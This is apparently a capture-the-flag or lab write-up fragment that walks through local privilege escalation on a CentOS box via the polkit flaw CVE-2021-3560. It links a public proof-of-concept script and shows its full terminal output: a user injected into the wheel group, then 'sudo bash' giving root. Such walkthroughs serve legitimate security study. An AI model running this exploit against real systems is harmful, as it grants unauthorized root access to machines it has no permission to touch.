Run linpeas on the victim and one of the first things it says is that this box is vulnerable to a priv esc CVE: CVE-2021-3560
- https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
- Run this PoC a couple of times. Once it says that it was exploited successfully, log in with the new user and run 'sudo bash' for a root shell
```bash
[dwight@paper shm]$ ./ex.sh 

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper shm]$ su - secnigma
Password: 
[secnigma@paper ~]$ id
uid=1005(secnigma) gid=1005(secnigma) groups=1005(secnigma),10(wheel)
[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma: 
[root@paper secnigma]# id
uid=0(root) gid=0(root) groups=0(root)
```
